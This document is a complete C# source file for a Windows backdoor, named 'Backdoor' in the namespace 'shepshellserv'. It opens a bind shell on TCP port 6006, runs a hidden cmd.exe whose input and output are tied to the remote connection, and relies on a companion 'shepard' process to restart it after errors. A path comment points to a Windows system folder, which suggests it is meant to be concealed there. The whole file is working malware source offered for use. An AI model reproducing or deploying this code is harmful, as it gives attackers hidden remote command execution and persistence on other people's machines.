//C:\Windows\ImmersiveControlPanel
using System;
using System.Threading;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
namespace shepshellserv
{
    public class Backdoor
    {
        private TcpListener listener;
        private Socket socket;
        private Process shell;
        private StreamReader reader;
        private StreamWriter writer;
        private StreamReader inStream;
        private StreamWriter outStream;
        private Thread shellThread;

        public Backdoor() { startServer(); }

        public static void Main(String[] args)
        {
            Backdoor backdoor = new Backdoor();
        }

        public void startServer() // starts the listener and streams
        {
            try
            {
                int port = 6006; // port the bind shell listens on 

                try
                {
                    listener = new TcpListener(port);
                    listener.Start();
                    socket = listener.AcceptSocket();
                }
                catch (Exception) {  }

                Stream s = new NetworkStream(socket);
                inStream = new StreamReader(s);
                outStream = new StreamWriter(s);
                outStream.AutoFlush = true;

                startCMD(); // create cmd instance
                writer = shell.StandardInput;
                reader = shell.StandardOutput;
                writer.AutoFlush = true;

                shellThread = new Thread(new ThreadStart(getShellInput));
                shellThread.Start();

                getInput(); // get command input to run from server
                burn(); // 

            }
            catch (Exception) { burn(); }
        }

        void startCMD()
        {
            shell = new Process();
            shell.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;

            ProcessStartInfo p = new ProcessStartInfo("cmd");
            p.WindowStyle = ProcessWindowStyle.Hidden;
            p.CreateNoWindow = true;
            p.UseShellExecute = false;
            p.RedirectStandardError = true;
            p.RedirectStandardInput = true;
            p.RedirectStandardOutput = true;
            shell.StartInfo = p;

            shell.Start();
        }
        void getShellInput()
        {
            try
            {

                String tempBuf = "";
                outStream.WriteLine("\r\n");
                while ((tempBuf = reader.ReadLine()) != null)
                {
                    outStream.WriteLine(tempBuf + "\r"); // contents + endline to buffer
                }
                burn();
            }
            catch (Exception) { }
        }

        private void getInput()
        {
            try
            {
                String tempBuff = "";
                while (((tempBuff = inStream.ReadLine()) != null))
                {
                    handleCommand(tempBuff); // execute command through CMD
                }
            }

            catch (Exception) { }
        }

        private void handleCommand(String input)
        {
            try
            {

                if (input.Equals("quit") || input.Equals("exit"))
                {
                    burn(); // errors out the program, restarting the shell in 30 seconds
                }
                else if (input.Equals("help"))
                {
                    outStream.WriteLine(@"
 _____   _   _   _____  ______    ___   ______  ______   _   _____       ______   _____   _   _  ______ 
/  ___| | | | | |  ___| | ___ \  / _ \  | ___ \ |  _  \ ( ) /  ___|      | ___ \ |_   _| | \ | | |  _  \
\ `--.  | |_| | | |__   | |_/ / / /_\ \ | |_/ / | | | | |/  \ `--.       | |_/ /   | |   |  \| | | | | |
 `--. \ |  _  | |  __|  |  __/  |  _  | |    /  | | | |      `--. \      | ___ \   | |   | . ` | | | | |
/\__/ / | | | | | |___  | |     | | | | | |\ \  | |/ /      /\__/ /      | |_/ /  _| |_  | |\  | | |/ / 
\____/  \_| |_/ \____/  \_|     \_| |_/ \_| \_| |___/       \____/       \____/   \___/  \_| \_/ |___/  
                                  
% d3adzo % 
Use this bind shell to execute any Windows commands. 
Sending the command <help> will bring this up again.
Sending the command <quit> will restart the shell in 30 seconds. 
");
                    writer.WriteLine("EOFX\r\n"); // EOFX is my way of determining when output is finished
                }
                else
                {
                    writer.WriteLine(input + "\r\n");
                    writer.WriteLine("EOFX\r\n");
                }
                
            }
            catch (Exception) { burn(); }
        }


        private void burn() // shuts down shell
        {
            shell.Close();
            shell.Dispose();
            shellThread = null;
            inStream.Dispose();
            outStream.Dispose();
            writer.Dispose();
            reader.Dispose();
            shell.Dispose();
            socket.Close();
            listener.Stop();
            
            throw new Exception(); //shepard restarts on error out
        }

    }
}
